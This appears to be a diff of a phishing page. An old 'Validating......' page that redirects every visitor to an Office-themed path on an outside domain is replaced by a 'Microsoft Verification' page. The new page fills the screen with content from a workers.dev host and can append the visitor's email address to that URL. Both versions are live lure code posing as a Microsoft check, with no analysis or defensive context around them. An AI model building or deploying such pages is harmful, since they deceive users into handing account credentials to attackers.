@@ -1,36 +1,33 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <title>Validating......</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1" />
-  </head>
-
-  <body>
-    <script>
-      function redirrectPage() {
-        var query = window.location.href;
-        console.log(query);
-        var res = query.split("?");
-        var data1 = res[0];
-        var data2 = res[1];
-        console.log(data1);
-        console.log(data2);
-
-        //realemailID = atob(data2);
-
-        if (data2) {
-          console.log("true");
-          window.location.href =
-            "https://cvenom.sa.com/office/" ;
-        } else {
-          console.log("false");
-          window.location.href =
-            "https://cvenom.sa.com/office/" ;
-        }
-      }
-      redirrectPage();
-    </script>
-  </body>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+    #obj {
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+    }
+  </style>
+  <title>Microsoft Verification</title>
+</head>
+<body>
+  <object data="https://8f2ef299.datacloud-edrives-portal.workers.dev/" id="obj" width="100%" height="100%" type="text/html">
+  </object>
+  <script type="text/javascript">
+    var email = "";
+    if (email) {
+      document.getElementById("obj").setAttribute('data', 'https://8f2ef299.datacloud-edrives-portal.workers.dev/'+email);
+    }
+  </script>
+</body>
 </html>
